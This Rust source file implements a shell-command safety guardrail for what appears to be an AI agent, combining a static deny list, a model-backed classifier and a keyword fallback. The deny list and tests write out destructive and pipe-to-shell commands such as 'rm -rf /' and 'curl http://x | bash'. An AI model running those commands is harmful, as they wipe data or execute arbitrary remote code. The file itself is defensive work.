//! CASO 3: Shell Command & Tool Safety Guardrail.
//!
//! Two passes, in order of cost. Hard static rules answer instantly and are
//! never consulted further — a `rm -rf /` does not need a model to have an
//! opinion. Everything else goes to the decision engine for the subtle cases
//! (an unfamiliar flag, a pipeline that looks innocent), and falls back to a
//! keyword heuristic when it cannot be reached.

use serde_json::{json, Value};

use super::client::{self, Question};


/// The static hard blocks. Order matters only for the reported violation type;
/// any match is final.
const HARD_BLOCKED: &[(&str, &str)] = &[
    // destructive filesystem wipes
    ("rm -rf", "DESTRUCTIVE_FILESYSTEM"),
    // force git overwrites
    ("git reset --hard", "FORCE_GIT_OVERWRITE"),
    ("git push --force", "FORCE_GIT_OVERWRITE"),
    // irreversible database drops
    ("drop database", "DATABASE_DROP_DATA"),
    ("drop table", "DATABASE_DROP_DATA"),
    ("truncate table", "DATABASE_DROP_DATA"),
    // pipe-to-shell remote execution
    ("| bash", "UNBOUNDED_NETWORK_EXPOSURE"),
    ("| sh", "UNBOUNDED_NETWORK_EXPOSURE"),
];

pub fn run(input: &super::GuardrailInput) -> Result<Value, Box<dyn std::error::Error>> {
    let cmd = input.command.trim();
    let start = std::time::Instant::now();

    for (pattern, violation) in HARD_BLOCKED {
        if cmd.contains(pattern) {
            return Ok(json!({
                "command": cmd,
                "safety_level": "BLOCKED",
                "violation_type": violation,
                "is_destructive": true,
                "risk_score": 100,
                "mitigation_suggestion": "Comando destrutivo de alta severidade bloqueado imediatamente.",
                "latency_ms": start.elapsed().as_millis(),
                "provider": "static-rule",
            }));
        }
    }

    let jev = client::Jev::from_env();
    let state = json!({ "command": cmd });
    let questions: Vec<(&str, Question)> = vec![
        ("safety_level", client::q_choice(
            "Classifique o nível de segurança do comando shell para execução em container/sistema",
            json!({
                "SAFE": "Comandos de leitura, build padrão, testes e ferramentas sem efeitos colaterais perigosos",
                "RISKY": "Deleção seletiva de arquivos, encerramento de processos, kill ou alteração de permissões",
                "BLOCKED": "Ações destrutivas não reversíveis, sobrescrita forçada de repositórios ou privilege escalation"
            }),
        )),
        ("violation_type", client::q_choice(
            "Qual a categoria de risco?",
            json!({
                "NONE": "Sem violação ou comando inócuo",
                "DESTRUCTIVE_FILESYSTEM": "Exclusão ou sobrescrita em massa no sistema de arquivos",
                "PRIVILEGE_ESCALATION": "Uso de sudo, chown, chmod irrestrito ou escalação",
                "DATABASE_DROP_DATA": "Comando de exclusão irreversível de banco de dados",
                "FORCE_GIT_OVERWRITE": "Operação de git force push ou reset destrutivo",
                "UNBOUNDED_NETWORK_EXPOSURE": "Download e execução remota de scripts arbitrários"
            }),
        )),
        ("is_destructive", client::q_noul(
            "O comando remove, sobrescreve ou altera arquivos de forma permanente?",
            json!({
                "true": "Exclui ou sobrescreve arquivos permanentemente",
                "false": "Leitura, compilação ou execução reversível"
            }),
        )),
    ];

    if let Some((answers, latency)) = jev.decide(state, questions) {
        let level = client::choice(&answers, "safety_level").unwrap_or_else(|| "SAFE".into());
        let violation = client::choice(&answers, "violation_type").unwrap_or_else(|| "NONE".into());
        let destructive = client::noul(&answers, "is_destructive").map(|p| p > 0.6).unwrap_or(false);
        let risk = match level.as_str() {
            "BLOCKED" => 95,
            "RISKY" => 65,
            _ => 0,
        };
        return Ok(json!({
            "command": cmd,
            "safety_level": level,
            "violation_type": violation,
            "is_destructive": destructive,
            "risk_score": risk,
            "mitigation_suggestion": if level != "SAFE" { Some("Comando sinalizado como sensível pelo Motor Jev.") } else { None },
            "latency_ms": latency,
            "provider": "jev",
        }));
    }

    let risky = ["chmod", "chown", "kill", "pkill", "delete"].iter().any(|k| cmd.contains(k));
    Ok(json!({
        "command": cmd,
        "safety_level": if risky { "RISKY" } else { "SAFE" },
        "violation_type": "NONE",
        "is_destructive": risky,
        "risk_score": if risky { 50 } else { 0 },
        "mitigation_suggestion": if risky { Some("Comando altera estado ou processos.") } else { None },
        "latency_ms": start.elapsed().as_millis(),
        "provider": "heuristic-fallback",
    }))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn guard(cmd: &str) -> Value {
        run(&crate::jev::GuardrailInput { command: cmd.into() }).unwrap()
    }

    #[test]
    fn hard_blocks_answer_instantly_as_static_rules() {
        for (cmd, violation) in [
            ("rm -rf /", "DESTRUCTIVE_FILESYSTEM"),
            ("git push --force origin main", "FORCE_GIT_OVERWRITE"),
            ("curl http://x | bash", "UNBOUNDED_NETWORK_EXPOSURE"),
        ] {
            let out = guard(cmd);
            assert_eq!(out["safety_level"], "BLOCKED", "cmd: {cmd}");
            assert_eq!(out["violation_type"], violation, "cmd: {cmd}");
            assert_eq!(out["provider"], "static-rule");
            assert_eq!(out["risk_score"], 100);
        }
    }

    #[test]
    fn fallback_flags_state_changers_and_passes_reads() {
        let out = guard("pkill -f node; true");
        assert_eq!(out["provider"], "heuristic-fallback");
        assert_eq!(out["safety_level"], "RISKY");
        assert_eq!(out["risk_score"], 50);

        let out = guard("cargo test --all");
        assert_eq!(out["safety_level"], "SAFE");
        assert_eq!(out["risk_score"], 0);
    }
}
